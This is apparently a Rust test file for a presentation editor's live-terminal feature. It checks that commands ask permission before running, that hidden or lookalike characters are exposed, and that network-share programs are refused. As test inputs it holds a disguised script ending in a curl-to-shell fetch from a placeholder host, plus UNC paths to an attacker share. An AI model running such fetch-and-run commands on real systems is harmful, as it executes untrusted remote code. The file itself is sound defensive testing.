    for fine in ["a\tb".to_string(), "a".repeat(4096), "echo \"hi\" | wc -c".to_string(), "  two  spaces ".to_string(), "café".to_string()] {
        assert_eq!(untypable(&fine), None, "{fine:?}");
        assert_eq!(may_type(&talk, &fine, &sh, &SessionYes::new(), &remembered), Decision::Ask, "{fine:?}");
    }
}

#[test]
fn a_changed_terminal_command_asks_again_for_the_same_text() {
    let folder = tempfile::tempdir().unwrap();
    let talk = TalkPlace::Folder(folder.path().to_path_buf());
    let scratch = tempfile::tempdir().unwrap();
    let mut remembered = permissions_in(scratch.path());
    let sh = words(&["sh"]);
    let mut session = SessionYes::new();
    session.allow_typed_for_tests(&talk, "make demo", &sh);
    remembered.remember_typed(&TalkFolder::of(&talk).unwrap(), "make demo", &sh).unwrap();
    assert_eq!(may_type(&talk, "make demo", &sh, &session, &remembered), Decision::Run);
    for other in [&["sh", "-l"][..], &["bash"], &["sh", ""]] {
        assert_eq!(may_type(&talk, "make demo", &words(other), &session, &remembered), Decision::Ask, "{other:?}");
    }
    // A terminal command that can't be run has nothing to type into.
    for broken in [&[][..], &["sh\u{200B}"], &["", "x"]] {
        assert_eq!(may_type(&talk, "make demo", &words(broken), &session, &remembered), Decision::Refused, "{broken:?}");
    }
}

// The dialog.

const TALK: &str = "# T\n\n<Terminal run=\"touch ran\" x=\"100\" y=\"100\" w=\"640\" h=\"360\" />\n";

fn ask(typing: &Typing, cx: &mut TestAppContext, command: &[&str]) -> bool {
    let command = words(command);
    let asked = cx
        .update_window(typing.handle, |_, window, cx| typing.view.update(cx, |view, cx| view.ask_to_run(command, window, cx)))
        .unwrap();
    typing.settle(cx);
    asked
}

fn decision(typing: &Typing, cx: &mut TestAppContext, command: &[&str]) -> Decision {
    let command = words(command);
    cx.read(|cx| typing.view.read(cx).run_decision(&command, cx))
}

fn showing(typing: &Typing, cx: &mut TestAppContext, id: &'static str) -> bool {
    typing.with_window(cx, |window, cx| {
        window.render_frame(cx);
        window.try_find(id).is_some_and(|found| found.visible())
    })
}

fn lines(typing: &Typing, cx: &mut TestAppContext) -> Vec<String> {
    typing.with_window(cx, |window, cx| {
        window.render_frame(cx);
        (0..200usize).map_while(|n| window.try_find((RUN_LINE_ID, n)).and_then(|line| line.label().map(str::to_string))).collect()
    })
}

/// The lines above the words, after the question.
fn head(typing: &Typing, cx: &mut TestAppContext) -> Vec<String> {
    typing.with_window(cx, |window, cx| {
        window.render_frame(cx);
        (0..50usize).map_while(|n| window.try_find((RUN_HEAD_LINE_ID, n)).and_then(|line| line.label().map(str::to_string))).collect()
    })
}

/// Where the top of the element `id` is, in the window.
fn top_of(typing: &Typing, cx: &mut TestAppContext, id: impl Into<gpui_kit::ElementId>) -> f32 {
    let id = id.into();
    typing.with_window(cx, |window, cx| {
        window.render_frame(cx);
        f32::from(window.find(id).bounds().origin.y)
    })
}

fn window(cx: &mut TestAppContext) -> (Typing, tempfile::TempDir) {
    let scratch = tempfile::tempdir().unwrap();
    let typing = open(cx, TALK);
    let remembered = permissions_in(scratch.path());
    typing.view.update(cx, |view, _| view.set_run_permissions_for_test(remembered));
    (typing, scratch)
}

fn folder_of(typing: &Typing) -> PathBuf {
    typing.file.parent().unwrap().canonicalize().unwrap()
}

#[gpui_kit::test]
fn the_dialog_shows_the_whole_command(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    let command = ["sh", "-c", "echo hi \"there\"", "x\\y"];
    assert!(ask(&typing, cx, &command));
    assert!(showing(&typing, cx, RUN_ASK_ID));
    let place = TalkPlace::Folder(folder_of(&typing));
    let program = plan(&place, &words(&command)).unwrap().shown_words().remove(0);
    let expected = vec![
        format!("\"{program}\""),
        "\"-c\"".to_string(),
        "\"echo hi \\\"there\\\"\"".to_string(),
        "\"x\\\\y\"".to_string(),
    ];
    assert_eq!(lines(&typing, cx), expected, "each word quoted on its own line, the program as the file that runs");
    assert_eq!(head(&typing, cx), ["in".to_string(), format!("\"{}\"", folder_of(&typing).display()), RUN_WARNING.to_string()]);
    assert!(typing.with_window(cx, |window, cx| {
        window.render_frame(cx);
        window.find(RUN_ASK_ID).label() == Some(RUN_QUESTION)
    }));
    for id in [RUN_YES_ID, RUN_ALWAYS_ID, RUN_NO_ID] {
        assert!(showing(&typing, cx, id), "{id}");
    }
}

#[gpui_kit::test]
fn an_honest_long_command_is_shown_in_full(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    let mut command = vec!["echo".to_string()];
    command.extend((1..60).map(|n| format!("argument-{n}")));
    let refs: Vec<&str> = command.iter().map(String::as_str).collect();
    assert!(ask(&typing, cx, &refs));
    let shown = lines(&typing, cx);
    assert_eq!(shown.len(), 60, "every word");
    for (n, line) in shown.iter().enumerate().take(60).skip(1) {
        assert_eq!(line, &format!("\"argument-{n}\""));
    }
}

#[gpui_kit::test]
fn what_matters_is_above_the_words_and_stays_put(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    assert!(ask(&typing, cx, &["echo", "one"]));
    let short = (top_of(&typing, cx, RUN_HEAD_ID), top_of(&typing, cx, (RUN_HEAD_LINE_ID, 2usize)), top_of(&typing, cx, RUN_WORDS_ID));
    typing.press(cx, "escape");
    let mut command = vec!["echo".to_string()];
    command.extend((1..64).map(|n| format!("argument-{n}")));
    let refs: Vec<&str> = command.iter().map(String::as_str).collect();
    assert!(ask(&typing, cx, &refs));
    assert_eq!(head(&typing, cx).last().map(String::as_str), Some(RUN_WARNING));
    let long = (top_of(&typing, cx, RUN_HEAD_ID), top_of(&typing, cx, (RUN_HEAD_LINE_ID, 2usize)), top_of(&typing, cx, RUN_WORDS_ID));
    // The warning is above the words, and a 64-word command moves nothing above them.
    let last = head(&typing, cx).len() - 1;
    let warning = top_of(&typing, cx, (RUN_HEAD_LINE_ID, last));
    assert!(warning < top_of(&typing, cx, (RUN_LINE_ID, 0usize)), "the warning comes before the first word");
    assert!(warning < top_of(&typing, cx, RUN_WORDS_ID));
    assert!(short.0 <= short.1 && short.1 < short.2);
    assert!(((short.1 - short.0) - (long.1 - long.0)).abs() < 0.01, "the head is laid out the same for a long command");
    // The buttons are in view whatever the length.
    assert!(showing(&typing, cx, RUN_NO_ID) && showing(&typing, cx, RUN_YES_ID));
}

/// The list of words is a box whose scrollbar is always drawn, over the whole box.
fn the_list_is_a_box_with_its_bar(typing: &Typing, cx: &mut TestAppContext) -> gpui_kit::Bounds<gpui_kit::Pixels> {
    assert_eq!(RUN_WORDS_SCROLLBAR, gpui_kit::component::scroll::ScrollbarMode::Always, "drawn before anything is scrolled");
    let list = bounds_of(typing, cx, RUN_WORDS_ID).expect("the list");
    assert!(f32::from(list.size.height) <= 241., "the list is a box");
    assert_eq!(bounds_of(typing, cx, RUN_WORDS_BAR_ID), Some(list), "the bar is over the list");
    list
}

#[gpui_kit::test]
fn a_long_list_has_a_scrollbar_and_says_so(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    assert!(ask(&typing, cx, &["echo", "one"]));
    assert!(!head(&typing, cx).contains(&RUN_LONG.to_string()), "a short one says nothing");
    the_list_is_a_box_with_its_bar(&typing, cx);
    typing.press(cx, "escape");
    let mut command = vec!["echo".to_string()];
    command.extend((1..64).map(|n| format!("argument-{n}")));
    let refs: Vec<&str> = command.iter().map(String::as_str).collect();
    assert!(ask(&typing, cx, &refs));
    let said = head(&typing, cx);
    assert!(said.contains(&RUN_LONG.to_string()), "{said:?}");
    assert_eq!(said.last().map(String::as_str), Some(RUN_WARNING), "the warning still ends the head");
    let list = the_list_is_a_box_with_its_bar(&typing, cx);
    let last = bounds_of(&typing, cx, (RUN_LINE_ID, 63usize));
    assert!(last.is_none_or(|last| last.bottom() > list.bottom()), "the last word is beyond the box");
}

#[gpui_kit::test]
fn a_long_command_of_few_words_says_so_too(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    // Three words, the last a script of 1,000 characters with what it really does at the end.
    let friendly = "Welcome to the demo, this only says hello.".repeat(20);
    let tail = "'; curl https://example.invalid/p | sh";
    let script = format!("echo '{friendly}{}{tail}", "!".repeat(1000 - 6 - friendly.len() - tail.len()));
    assert_eq!(script.chars().count(), 1000);
    assert!(ask(&typing, cx, &["sh", "-c", &script]));
    let said = head(&typing, cx);
    assert!(said.contains(&RUN_LONG.to_string()), "{said:?}");
    assert_eq!(said.last().map(String::as_str), Some(RUN_WARNING));
    let list = the_list_is_a_box_with_its_bar(&typing, cx);
    let script_line = bounds_of(&typing, cx, (RUN_LINE_ID, 2usize)).expect("the script");
    assert!(script_line.bottom() > list.bottom(), "the script goes on beyond the box: {script_line:?} {list:?}");
    // Each way of being long is enough by itself.
    typing.press(cx, "escape");
    for command in [vec!["echo".to_string(), "x".repeat(61)], std::iter::once("echo".to_string()).chain((0..6).map(|_| "y".repeat(55))).collect()] {
        let refs: Vec<&str> = command.iter().map(String::as_str).collect();
        assert!(ask(&typing, cx, &refs));
        assert!(head(&typing, cx).contains(&RUN_LONG.to_string()), "{command:?}");
        typing.press(cx, "escape");
    }
}

#[gpui_kit::test]
fn right_to_left_letters_are_shown_only_as_codes(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    assert!(ask(&typing, cx, &["echo", "\u{5d0}\u{5d1}x", "\u{627}", "\u{10800}", "\u{FB1D}", "\u{1E900}"]));
    let shown = lines(&typing, cx);
    assert_eq!(
        shown[1..],
        ["\"[U+05D0][U+05D1]x\"", "\"[U+0627]\"", "\"[U+10800]\"", "\"[U+FB1D]\"", "\"[U+1E900]\""],
        "none is drawn"
    );
    assert!(head(&typing, cx).contains(&stagepack_studio::live_terminal::RUN_NOT_ASCII.to_string()));
}

#[gpui_kit::test]
fn a_program_named_by_a_path_says_whose_it_is(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    let absolute = sys_dir().join("sh").display().to_string();
    assert!(ask(&typing, cx, &[&absolute]));
    assert!(head(&typing, cx).contains(&RUN_PROGRAM_BY_PATH.to_string()));
    assert!(!head(&typing, cx).contains(&RUN_PROGRAM_IN_TALK.to_string()));
}

#[test]
fn what_is_run_on_a_network_path_is_never_touched() {
    // Windows and macOS only: these have not been compiled or run where this was written.
    #[cfg(windows)]
    {
        let folder = tempfile::tempdir().unwrap();
        let talk = TalkPlace::Folder(folder.path().to_path_buf());
        for word in ["//attacker.example/share/x.exe", "\\\\attacker.example\\share\\x.exe", "\\\\?\\UNC\\attacker.example\\share\\x.exe", "\\\\.\\pipe\\x"] {
            let why = plan_with_path(&talk, &words(&[word]), None).unwrap_err();
            assert!(why.contains("network folder"), "{word}: {why}");
        }
        assert!(plan_with_path(&talk, &words(&["sh", "a\"b"]), None).is_err(), "a double quote in an argument");
    }
    #[cfg(target_os = "macos")]
    {
        let folder = tempfile::tempdir().unwrap();
        let talk = TalkPlace::Folder(folder.path().to_path_buf());
        for word in ["/net/host/x", "/Network/Servers/x"] {
            let why = plan_with_path(&talk, &words(&[word]), None).unwrap_err();
            assert!(why.contains("network folder"), "{word}: {why}");
        }
    }
}

#[gpui_kit::test]
fn letters_outside_ascii_are_pointed_out_and_named(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    assert!(ask(&typing, cx, &["echo", "plain"]));
    assert!(!head(&typing, cx).contains(&RUN_NOT_ASCII.to_string()));
    typing.press(cx, "escape");
    assert!(ask(&typing, cx, &["echo", "g\u{456}thub", "bl\u{e5}b\u{e6}r"]));
    assert!(head(&typing, cx).contains(&RUN_NOT_ASCII.to_string()));
    let shown = lines(&typing, cx);
    assert!(shown.contains(&"\"g\u{456}[U+0456]thub\"".to_string()), "{shown:?}");
    assert!(shown.contains(&"\"bl\u{e5}b\u{e6}r\"".to_string()), "Latin-1 is just shown: {shown:?}");
}

#[gpui_kit::test]
fn a_command_that_hides_is_never_asked_about(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    for word in ["a\u{202E}b", "a\u{200B}b", "a\nb", "a\tb", "a\u{2028}b", "a   b", " lead"] {
        assert!(!ask(&typing, cx, &["echo", word]), "{word:?}");
        assert!(!showing(&typing, cx, RUN_ASK_ID), "{word:?}");
        assert!(typing.status(cx).is_some_and(|said| said.contains("can't be seen")), "it says why");
        assert_eq!(decision(&typing, cx, &["echo", word]), Decision::Refused);
    }
}

#[gpui_kit::test]
fn a_program_that_comes_with_the_talk_says_so(cx: &mut TestAppContext) {
    let scratch = tempfile::tempdir().unwrap();
    let folder = tempfile::tempdir().unwrap();
    std::fs::write(folder.path().join("slides.md"), TALK).unwrap();
    #[cfg(unix)]
    program(folder.path(), "tool");
    let typing = open_folder(cx, folder, None);
    typing.view.update(cx, |view, _| view.set_run_permissions_for_test(permissions_in(scratch.path())));
    assert!(ask(&typing, cx, &["./tool", "go"]));
    let shown = lines(&typing, cx);
    assert_eq!(shown[0], "\"<talk>/tool\"");
    assert!(head(&typing, cx).contains(&RUN_PROGRAM_IN_TALK.to_string()));
}

#[gpui_kit::test]
fn escape_and_dont_run_refuse(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    let sh = ["sh"];
    assert!(ask(&typing, cx, &sh));
    typing.press(cx, "escape");
    assert!(!showing(&typing, cx, RUN_ASK_ID));
    assert_eq!(decision(&typing, cx, &sh), Decision::Refused);
    assert!(!ask(&typing, cx, &sh));
    assert!(!showing(&typing, cx, RUN_ASK_ID));

    assert!(ask(&typing, cx, &["ls"]));
    click_on(&typing, cx, RUN_NO_ID);
    assert!(!showing(&typing, cx, RUN_ASK_ID));
    assert_eq!(decision(&typing, cx, &["ls"]), Decision::Refused);

    // The keyboard starts on Don't run, so Enter and Space, which a presenter might tap, refuse.
    for (key, command) in [("enter", "cat"), ("space", "true")] {
        assert!(ask(&typing, cx, &[command]));
        let focused = typing.with_window(cx, |window, cx| {
            window.render_frame(cx);
            window.find(RUN_NO_ID).focused()
        });
        assert_eq!(focused, Some(true), "Don't run has the keyboard");
        typing.press(cx, key);
        assert!(!showing(&typing, cx, RUN_ASK_ID), "{key}");
        assert_eq!(decision(&typing, cx, &[command]), Decision::Refused, "{key}");
    }
    assert!(typing.with_window(cx, |window, cx| !window.has_active_dialog(cx)));
}

#[gpui_kit::test]
fn a_question_while_another_is_open_is_not_a_no(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    assert!(ask(&typing, cx, &["sh"]));
    assert!(!ask(&typing, cx, &["ls"]), "not asked while the first is");
    assert_eq!(decision(&typing, cx, &["ls"]), Decision::Ask, "and not refused");
    typing.press(cx, "escape");
    assert!(ask(&typing, cx, &["ls"]), "asked when it can be");
    assert!(showing(&typing, cx, RUN_ASK_ID));
}

#[gpui_kit::test]
fn a_click_beside_the_dialog_does_nothing(cx: &mut TestAppContext) {
    let (typing, _scratch) = window(cx);
    assert!(ask(&typing, cx, &["sh"]));
    let at = typing.at(cx, 1., 1.);
    typing.click(cx, at);
    let corner = gpui_kit::point(gpui_kit::px(3.), gpui_kit::px(3.));
    typing.click(cx, corner);
    assert!(showing(&typing, cx, RUN_ASK_ID), "still asking");
    assert_eq!(decision(&typing, cx, &["sh"]), Decision::Ask, "and nothing was said");
}

#[gpui_kit::test]
fn run_is_for_the_session_and_always_is_kept(cx: &mut TestAppContext) {
    let (typing, scratch) = window(cx);
    assert!(ask(&typing, cx, &["sh"]));
    click_on(&typing, cx, RUN_YES_ID);
    assert_eq!(decision(&typing, cx, &["sh"]), Decision::Run);
    assert!(!scratch.path().join("terminal-permissions.json").exists(), "Run is not kept");
    assert!(ask(&typing, cx, &["cat"]));
    click_on(&typing, cx, RUN_ALWAYS_ID);
    assert_eq!(decision(&typing, cx, &["cat"]), Decision::Run);
    let place = TalkPlace::Folder(folder_of(&typing));
    let kept = plan(&place, &words(&["cat"])).unwrap();
    assert!(permissions_in(scratch.path()).always(&folder_of(&typing), kept.key().command()));
    assert!(!permissions_in(scratch.path()).always(&folder_of(&typing), plan(&place, &words(&["sh"])).unwrap().key().command()));
}

#[gpui_kit::test]
fn always_that_cant_be_kept_says_so(cx: &mut TestAppContext) {
    let typing = open(cx, TALK);
    // A store whose file can't be written: its folder is a file.
    let blocker = tempfile::tempdir().unwrap();
    std::fs::write(blocker.path().join("in-the-way"), "").unwrap();
    let remembered = RunPermissions::load(blocker.path().join("in-the-way/terminal-permissions.json"));
    typing.view.update(cx, |view, _| view.set_run_permissions_for_test(remembered));
    assert!(ask(&typing, cx, &["sh"]));
    click_on(&typing, cx, RUN_ALWAYS_ID);
    assert_eq!(decision(&typing, cx, &["sh"]), Decision::Run, "still a yes for now");
    assert!(typing.status(cx).is_some_and(|said| said.contains("only for now")));
}

#[gpui_kit::test]
fn a_packed_or_untitled_talk_cant_choose_always(cx: &mut TestAppContext) {
    let (typing, places) = open_untitled(cx, "light");
    let remembered = permissions_in(places.documents.parent().unwrap());
    typing.view.update(cx, |view, _| view.set_run_permissions_for_test(remembered));
    assert!(ask(&typing, cx, &["sh"]));
    assert!(showing(&typing, cx, RUN_YES_ID));
    assert!(!showing(&typing, cx, RUN_ALWAYS_ID));
    assert_eq!(head(&typing, cx)[..2], ["in".to_string(), RUN_IN_NEW_FOLDER.to_string()]);
    click_on(&typing, cx, RUN_YES_ID);
    assert_eq!(decision(&typing, cx, &["sh"]), Decision::Run);
    assert!(!places.documents.parent().unwrap().join("terminal-permissions.json").exists());
}

// No way round it.

static ENVIRONMENT: Mutex<()> = Mutex::new(());

fn environment() -> MutexGuard<'static, ()> {
    ENVIRONMENT.lock().unwrap_or_else(|e| e.into_inner())
}

/// A helper that writes down that it was started, and every byte it's sent.
#[cfg(unix)]
fn recording_helper(dir: &Path, record: &Path) -> PathBuf {
    use std::os::unix::fs::PermissionsExt as _;
    let script = dir.join("recording-helper");
    std::fs::write(&script, format!("#!/bin/sh\necho started >> '{0}'\ncat >> '{0}'\n", record.display())).unwrap();
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
    script
}

#[cfg(unix)]
fn real_helper() -> PathBuf {
    helper::helper_program()
}

/// A second window on the folder `path`, as another window of the same talk.
fn second_window_on(cx: &mut TestAppContext, path: &Path) -> (AnyWindowHandle, gpui_kit::Entity<stagepack_studio::workspace_view::WorkspaceView>) {
    let document = Document::open(path, Fonts::bundled_only()).unwrap();
    cx.update(|cx| {
        gpui_kit::init(cx);
        stagepack_studio::workspace_view::init(cx);
        let bounds = gpui_kit::Bounds { origin: gpui_kit::Point::default(), size: gpui_kit::size(gpui_kit::px(1280.), gpui_kit::px(800.)) };
        gpui_kit::open_window(
            gpui_kit::WindowOptions { window_bounds: Some(gpui_kit::WindowBounds::Windowed(bounds)), ..Default::default() },
            cx,
            |window, cx| cx.new(|cx| stagepack_studio::workspace_view::WorkspaceView::open_with(document, window, cx)),
        )
        .expect("a window")
    })
}

#[cfg(unix)]
#[gpui_kit::test]
fn no_way_round_the_yes(cx: &mut TestAppContext) {
    let _turn = environment();
    let scratch = tempfile::tempdir().unwrap();
    let record = scratch.path().join("record");
    std::fs::write(&record, "").unwrap();
    let helper = recording_helper(scratch.path(), &record);
    // SAFETY: the tests that read the environment take their turn on `ENVIRONMENT`.
    unsafe { std::env::set_var(HELPER_ENV, &helper) };
    let empty = |what: &str| assert_eq!(std::fs::read(&record).unwrap(), Vec::<u8>::new(), "nothing started: {what}");

    let folder = tempfile::tempdir().unwrap();
    std::fs::write(folder.path().join("slides.md"), format!("{TALK}\n---\n\n# Two\n")).unwrap();
    let path = folder.path().to_path_buf();
    let typing = open_folder(cx, folder, None);
    typing.settle(cx);
    wait(cx, 1_000);
    empty("opened and shown in the editor");
    let terminal = thing(&typing, cx, "<Terminal");
    let at = typing.at(cx, terminal.rect.x + terminal.rect.w / 5., terminal.rect.y + terminal.rect.h / 5.);
    typing.click(cx, at);
    go_to(&typing, cx, 1);
    typing.press(cx, "pageup");
    assert_eq!(typing.current(cx), 0);
    wait(cx, 1_000);
    empty("selected, and the slides' thumbnails made");

    let out = tempfile::tempdir().unwrap();
    let document = typing.document(cx);
    let input = || cx.read(|cx| document.read(cx).export_input());
    for (kind, name) in [(ExportKind::Pdf, "a.pdf"), (ExportKind::PowerPoint, "a.pptx")] {
        run_export(input(), kind, &out.path().join(name)).unwrap();
    }
    empty("exported as PDF and PowerPoint");

    for command in ["check", "outline", "picture"] {
        let mut args: Vec<std::ffi::OsString> = vec!["studio".into(), command.into(), path.clone().into_os_string()];
        if command == "picture" {
            args.push("1".into());
            args.push("--out".into());
            args.push(out.path().join("p.png").into_os_string());
        }
        let _ = stagepack_studio::ai_tool::run_command(&args);
    }
    empty("the AI tool's commands");

    // The presenter's view, in a rehearsal and in a show.
    cx.update(|cx| {
        stagepack_studio::workspace_view::bind_keys(cx);
        let _ = start_show(document.clone(), true, cx);
        let _ = start_show(document.clone(), false, cx);
    });
    wait(cx, 1_000);
    empty("the presenter's view");

    // A second window of the same folder.
    let second = second_window_on(cx, &path).0;
    wait(cx, 1_000);
    empty("a second window of the same talk");
    let _ = second;

    // The start screen's preview of a new presentation that holds the tag.
    let root = tempfile::tempdir().unwrap();
    let recovery = stagepack_studio::recovery::Recovery::new(root.path().join("recovery"));
    recovery.keep_untitled(UntitledId(9), "Untitled presentation", TALK, &[], &[]).unwrap();
    let start = open_start_with(cx, recovery);
    wait(cx, 1_000);
    empty("the start screen's previews");
    let _ = start;

    // Asking, and saying yes, only records the yes.
    let command = ["touch", "ran"];
    assert!(ask(&typing, cx, &command));
    click_on(&typing, cx, RUN_YES_ID);
    assert_eq!(decision(&typing, cx, &command), Decision::Run);
    wait(cx, 1_000);
    empty("a yes was said");
    assert!(!path.join("ran").exists(), "nothing ran");

    // The one door, without a yes, is shut and the helper isn't even run.
    let place = TalkPlace::Folder(path.clone());
    let remembered = permissions_in(scratch.path());
    let command = words(&command);
    assert!(matches!(start_after_yes(&place, &command, &SessionYes::new(), &remembered, &helper, (40, 6)), Err(Decision::Ask)));
    let mut refused = SessionYes::new();
    refused.refuse_for_tests(plan(&place, &command).unwrap().key());
    assert!(matches!(start_after_yes(&place, &command, &refused, &remembered, &helper, (40, 6)), Err(Decision::Refused)));
    empty("the one door, shut");

    // Controls: with a yes the same door does start the recording helper, and the real one runs
    // the command, so what was checked above could have failed.
    let mut yes = SessionYes::new();
    yes.allow_for_tests(plan(&place, &command).unwrap().key());
    let started = start_after_yes(&place, &command, &yes, &remembered, &helper, (40, 6)).expect("a yes starts it");
    let began = std::time::Instant::now();
    while std::fs::read(&record).unwrap().is_empty() && began.elapsed() < std::time::Duration::from_secs(10) {
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    assert!(!std::fs::read(&record).unwrap().is_empty(), "the record would show a start");
    drop(started);
    let started = start_after_yes(&place, &command, &yes, &remembered, &real_helper(), (40, 6)).expect("a yes starts it");
    let began = std::time::Instant::now();
    while !path.join("ran").exists() && began.elapsed() < std::time::Duration::from_secs(10) {
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    assert!(path.join("ran").exists(), "a real start makes the file, so the check above was live");
    drop(started);
    // Entering a show on the run slide with no yes asks, over the window the presenter looks at,
    // and starts nothing until *Run*. *Don't run* and Escape start nothing either.
    std::fs::write(&record, "").unwrap();
    for answer in ["Don't run", "Escape", "Run"] {
        let (handle, view) = second_window_on(cx, &path);
        wait(cx, 500);
        cx.simulate_keystrokes(handle, "shift-f5");
        cx.run_until_parked();
        let show = view.read_with(cx, |view, _| view.current_show()).expect("a show was started");
        let (audience, presenter) = cx.read(|cx| {
            let show = show.read(cx);
            (show.audience().expect("an audience window").0, show.presenter().expect("a presenter window").0)
        });
        let mut asked = false;
        for _ in 0..40 {
            for window in [audience, presenter] {
                cx.update_window(window, |_, window, cx| window.render_frame(cx)).unwrap();
            }
            cx.run_until_parked();
            asked = cx.update_window(presenter, |_, window, cx| {
                window.render_frame(cx);
                window.try_find(RUN_ASK_ID).is_some()
            })
            .unwrap();
            if asked {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(25));
        }
        assert!(asked, "{answer}: the show asks in the presenter's window");
        assert!(!cx.update_window(audience, |_, window, cx| { window.render_frame(cx); window.try_find(RUN_ASK_ID).is_some() }).unwrap());
        std::thread::sleep(std::time::Duration::from_millis(300));
        empty(&format!("{answer}: the question is open"));
        match answer {
            "Don't run" => cx.update_window(presenter, |_, window, cx| window.click(RUN_NO_ID, cx)).unwrap(),
            "Escape" => cx.simulate_keystrokes(presenter, "escape"),
            _ => cx.update_window(presenter, |_, window, cx| window.click(RUN_YES_ID, cx)).unwrap(),
        }
        cx.run_until_parked();
        if answer != "Run" {
            for _ in 0..8 {
                for window in [audience, presenter] {
                    cx.update_window(window, |_, window, cx| window.render_frame(cx)).unwrap();
                }
                cx.run_until_parked();
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
            empty(&format!("{answer}: answered"));
        } else {
            let began = std::time::Instant::now();
            while std::fs::read(&record).unwrap().is_empty() && began.elapsed() < std::time::Duration::from_secs(10) {
                for window in [audience, presenter] {
                    cx.update_window(window, |_, window, cx| window.render_frame(cx)).unwrap();
                }
                cx.run_until_parked();
                std::thread::sleep(std::time::Duration::from_millis(25));
            }
            assert!(!std::fs::read(&record).unwrap().is_empty(), "Run starts it, so the record could have shown a start");
        }
        cx.update(|cx| show.update(cx, |show, cx| show.end(cx)));
        cx.run_until_parked();
    }
    unsafe { std::env::remove_var(HELPER_ENV) };
}

fn open_start_with(cx: &mut TestAppContext, recovery: stagepack_studio::recovery::Recovery) -> AnyWindowHandle {
    cx.update(|cx| {
        gpui_kit::init(cx);
        stagepack_studio::workspace_view::init(cx);
        let bounds = gpui_kit::Bounds { origin: gpui_kit::Point::default(), size: gpui_kit::size(gpui_kit::px(1280.), gpui_kit::px(800.)) };
        gpui_kit::open_window(
            gpui_kit::WindowOptions { window_bounds: Some(gpui_kit::WindowBounds::Windowed(bounds)), ..Default::default() },
            cx,
            |window, cx| cx.new(|cx| stagepack_studio::workspace_view::WorkspaceView::for_start(Some(recovery), window, cx)),
        )
        .expect("a window")
        .0
    })
}

/// `line` without a trailing `//` comment, one that begins inside a string not counting.
fn without_comment(line: &str) -> &str {
    let (mut quoted, mut escaped) = (false, false);
    let bytes = line.as_bytes();
    for (at, byte) in bytes.iter().enumerate() {
        match byte {
            _ if escaped => escaped = false,
            b'\\' if quoted => escaped = true,
            b'"' => quoted = !quoted,
            b'/' if !quoted && bytes.get(at + 1) == Some(&b'/') => return &line[..at],
            _ => {}
        }
    }
    line
}

fn rust_files(folder: &Path, found: &mut Vec<(String, String, String)>, root: &Path) {
    for entry in std::fs::read_dir(folder).unwrap() {
        let path = entry.unwrap().path();
        if path.is_dir() {
            rust_files(&path, found, root);
        } else if path.extension().is_some_and(|extension| extension == "rs") {
            let raw = std::fs::read_to_string(&path).unwrap();
            let text: String = raw.lines().map(without_comment).collect::<Vec<_>>().join("\n");
            found.push((path.strip_prefix(root).unwrap().display().to_string(), text, raw));
        }
    }
}

/// A backstop to the types: a program is started in one place, the helper is spoken to in one
/// place, and nothing outside the one door makes a permit.
#[test]
fn a_program_is_started_from_one_place_and_it_asks() {
    let src = Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
    let mut files = Vec::new();
    rust_files(&src, &mut files, &src);
    let outside = |name: &str, allowed: &[&str]| -> Vec<String> {
        files.iter().filter(|(file, text, _)| text.contains(name) && !allowed.contains(&file.as_str())).map(|(file, _, _)| file.clone()).collect()
    };
    // The test hooks are named in comments too, and are looked for there as well: a name on a line
    // that has a string with `//` in it is still seen.
    let raw_outside = |name: &str, allowed: &[&str]| -> Vec<String> {
        files.iter().filter(|(file, _, raw)| raw.contains(name) && !allowed.contains(&file.as_str())).map(|(file, _, _)| file.clone()).collect()
    };
    // Starting a session, in any spelling: only the door (and the definition).
    for spelling in ["Session::start", "Session :: start", "Session as"] {
        let places = outside(spelling, &["live_terminal/session.rs", "live_terminal/permission.rs"]);
        assert!(places.is_empty(), "{spelling}: {places:?}");
    }
    for hook in ["unchecked_for_tests", "allow_for_tests", "refuse_for_tests"] {
        assert!(raw_outside(hook, &["live_terminal/permission.rs"]).is_empty(), "{hook}");
    }
    // And they exist only in a build with the feature.
    let door_raw = &files.iter().find(|(file, _, _)| file == "live_terminal/permission.rs").unwrap().2;
    for hook in ["fn unchecked_for_tests", "fn allow_for_tests", "fn refuse_for_tests"] {
        let at = door_raw.find(hook).unwrap();
        assert!(door_raw[..at].trim_end().ends_with("#[doc(hidden)]") || door_raw[..at].contains("#[cfg(feature = \"test-hooks\")]"), "{hook}");
        let before = &door_raw[..at];
        let attribute = before.rfind("#[cfg(feature = \"test-hooks\")]").expect("behind the feature");
        assert!(before[attribute..].lines().count() <= 5, "{hook} is behind the feature");
    }
    assert!(outside("Permit {", &["live_terminal/permission.rs"]).is_empty());
    // The helper is found and run only by the live terminal's own files.
    assert!(outside("Command::new", &["live_terminal/session.rs"]).iter().all(|file| !file.starts_with("live_terminal/")), "a second way to run a program");
    for name in ["find_helper", "HELPER_ENV"] {
        // The window finds it only to hand its path to the one door, which starts nothing without a yes.
        let places = outside(name, &["live_terminal/helper.rs", "live_terminal/mod.rs", "live_terminal/permission.rs", "workspace_view/running.rs"]);
        assert!(places.is_empty(), "{name}: {places:?}");
    }
    // The door asks first.
    let door = &files.iter().find(|(file, _, _)| file == "live_terminal/permission.rs").unwrap().1;
    let body = &door[door.find("pub fn start_after_yes").unwrap()..];
    assert!(body.contains("permit(") && body.contains("Session::start("));
    let made = &door[door.find("pub fn permit").unwrap()..door.find("pub fn start_after_yes").unwrap()];
    assert!(made.find("decide(").unwrap() < made.find("Permit {").unwrap());
}
